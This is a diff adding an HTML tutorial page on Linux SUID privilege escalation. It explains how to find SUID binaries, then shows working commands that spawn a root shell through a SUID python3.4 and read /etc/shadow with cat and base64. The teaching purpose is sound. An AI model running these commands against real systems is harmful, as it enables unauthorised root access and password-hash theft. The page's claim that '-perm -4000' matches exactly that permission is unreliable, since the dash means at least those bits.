@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SUID Binary Exploits - Rare Code Base</title>
+    <meta name="description"
+        content="Master Linux privilege escalation using SUID binaries. This guide covers practical examples, GTFOBins usage, and step-by-step exploitation techniques to gain root access.">
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <script src="/js/main.js" defer></script>
+    <script src="/js/sidebar.js" defer></script>
+</head>
+
+<body>
+    <div id="navbar-placeholder"></div>
+    <main class="d-lg-flex flex-nowrap d-block">
+        <div id="sidebar-placeholder"></div>
+        <div class="content p-4">
+            <h1 class="mt-4">SUID Binary Exploits</h1>
+
+            <h2 class="mt-5">What is SUID?</h2>
+            <p>
+                SUID (Set User ID) is a special permission in Linux that is given to an executable file.
+                When a file has SUID permission set, it allows a user to run that file with the <b>permissions of the
+                    file's owner</b>.
+            </p>
+            <p>
+                The <b>owner</b> of the file is often <b>root</b> (the system administrator), which means if a file is
+                owned by root and has the SUID bit set,
+                any user running the file will get root permissions to execute that file.
+            </p>
+            <p>
+                This means that even if a user is a regular user with no special privileges, by running a SUID file,
+                they get access to <b>root</b>
+                (administrator) privileges for that specific file execution.
+            </p>
+
+            <h3 class="mt-4">How to Check and Set SUID Permissions</h3>
+            <p>To check if a file has the SUID bit set, you can use the following command:</p>
+            <pre><code>$ ls -l <filename></code></pre>
+            <p>This will list the file's details, and if the file has the SUID bit set, you will see an "s" in the
+                owner's execute position of the file's permissions (like: <code>-rwsr-xr-x</code>).</p>
+
+            <h3 class="mt-4">How to Set and Remove the SUID Bit</h3>
+            <p>If you want to set or remove the SUID permission for a file, you can use the <code>chmod</code> command:
+            </p>
+
+            <p>To set the SUID bit:</p>
+            <pre><code>$ sudo chmod u+s <filename></code></pre>
+            <p>In this command:</p>
+            <ul>
+                <li><b>u</b> stands for the user (owner) of the file.</li>
+                <li><b>+s</b> adds the SUID bit to the file's permissions.</li>
+            </ul>
+
+            <p>For example, to set the SUID bit for a file called <code>example.sh</code>, you would use:</p>
+            <pre><code>$ sudo chmod u+s example.sh</code></pre>
+
+            <p>To remove the SUID bit:</p>
+            <pre><code>$ sudo chmod u-s <filename></code></pre>
+            <p>In this command:</p>
+            <ul>
+                <li><b>-s</b> removes the SUID bit from the file's permissions.</li>
+            </ul>
+
+            <p>For example, to remove the SUID bit from <code>example.sh</code>, you would use:</p>
+            <pre><code>$ sudo chmod u-s example.sh</code></pre>
+
+            <h3 class="mt-4">How to Identify SUID Binaries</h3>
+            <pre><code>$ find / -type f -perm -4000 2>/dev/null</code></pre>
+            <p>This command will list all files with the SUID bit set on your system.</p>
+
+            <h3 class="mt-4">Breaking Down the Find Command</h3>
+            <p>The following command is used to find files with the SUID bit set:</p>
+            <pre><code>$ find / -type f -perm -4000 2>/dev/null</code></pre>
+
+            <h4 class="mt-4">Explanation of the Command:</h4>
+            <ul>
+                <li><b><code>find</code></b>: The command used to search for files and directories.</li>
+                <li><b><code>/</code></b>: This specifies the starting directory for the search. In this case, it
+                    searches from the root directory (/) and goes through the entire system.</li>
+                <li><b><code>-type f</code></b>: This option restricts the search to only regular files. This ensures
+                    that
+                    directories and other types of file systems are excluded from the results. Only files (not
+                    directories) with
+                    the specified permissions will be shown.</li>
+                <li><b><code>-perm -4000</code></b>: This part tells the <code>find</code> command to search for files
+                    with a <b>specific permission</b>, in this case, <b>SUID</b> permission. The <code>4000</code>
+                    represents the SUID bit in octal notation. The <code>-</code> means the command will look for files
+                    with exactly this permission set.</li>
+                <li><b><code>2>/dev/null</code></b>: This part hides any error messages that might appear during the
+                    search, such as "permission denied" errors when the command cannot access certain directories. This
+                    ensures that
+                    you only see the list of files with the required permission without any interruptions from system
+                    errors.</li>
+            </ul>
+
+            <p>So, the entire command will search for files with the SUID bit set in the whole system and ignore any
+                errors that occur due to restricted access.</p>
+
+            <h3 class="mt-4">Why Are They Dangerous?</h3>
+            <p>
+                If a SUID binary has a security vulnerability or flaw, an attacker could exploit it to gain <b>root
+                    access</b>.
+                This is why SUID binaries need to be carefully managed and secured to prevent malicious use.
+            </p>
+
+
+            <h3 class="mt-5">Practical Example: Exploiting SUID Binaries</h3>
+            <p>Let's go through a real example to understand how SUID binaries can be dangerous if misconfigured.</p>
+
+            <h4 class="mt-4">Finding SUID Binaries</h4>
+            <p>To find all files with the SUID bit set, run the following command:</p>
+            <pre><code>$ find / -type f -perm -4000 2>/dev/null</code></pre>
+
+            <img src="images/suid_binaries.png" alt="List of SUID Binaries"
+                style="width: 600px; max-width: 100%; border: 1px solid #ccc; border-radius: 8px; margin: 16px 0;">
+
+            <p>This will list SUID files like <code>/usr/bin/python3.4</code>, <code>/bin/cat</code>, and
+                <code>/usr/bin/base64</code>.
+            </p>
+
+            <h4 class="mt-4">Exploiting <code>/usr/bin/python3.4</code></h4>
+            <p>If <code>python3.4</code> is a SUID binary and owned by <b>root</b>, we can use it to spawn a root shell:
+            </p>
+            <pre><code>$ /usr/bin/python3.4 -c 'import os; os.execl("/bin/sh", "sh")'</code></pre>
+            <p>Once executed, you can confirm you have root access by running:</p>
+            <pre><code># whoami
+root</code></pre>
+
+            <h4 class="mt-4">Exploiting <code>/bin/cat</code></h4>
+            <p>The <code>cat</code> command can't spawn a shell, but since it's SUID, it can read protected files. For
+                example:</p>
+            <pre><code>$ cat /etc/shadow</code></pre>
+
+            <h4 class="mt-4">Exploiting <code>/usr/bin/base64</code></h4>
+            <p>As shown above, <code>/usr/bin/base64</code> is a SUID binary. According to <b>GTFOBins</b>, it can be
+                used to read files like this:</p>
+            <pre><code>$ /usr/bin/base64 /etc/shadow</code></pre>
+            <p>This will output the contents in base64. You can decode it using:</p>
+            <pre><code>$ /usr/bin/base64 /etc/shadow | base64 -d</code></pre>
+
+            <img src="images/base64_gtfobins.png" alt="GTFOBins base64 example"
+                style="width: 600px; max-width: 100%; border: 1px solid #ccc; border-radius: 8px; margin: 16px 0;">
+
+            <p>As shown in the GTFOBins screenshot above, you can use <code>base64</code> to read any file if it runs
+                with elevated privileges.</p>
+
+            <h4 class="mt-4">What is GTFOBins?</h4>
+            <p><b>GTFOBins</b> is a curated list of Unix binaries that can be exploited when misconfigured (e.g., with
+                SUID or sudo). These can allow:</p>
+            <ul>
+                <li>Privilege escalation</li>
+                <li>File access</li>
+                <li>Shell spawning</li>
+                <li>Reverse shells</li>
+            </ul>
+            <p>Visit <a href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a> to explore
+                more.</p>
+
+            <h4 class="mt-4">Conclusion</h4>
+            <p>This example demonstrates how misconfigured SUID binaries like <code>python3.4</code> can give attackers
+                root access, while others like <code>cat</code> may still leak sensitive data. Always audit and secure
+                SUID binaries to protect your system.</p>
+
+        </div>
+    </main>
+    <div id="footer-placeholder"></div>
+</body>
+
+</html>
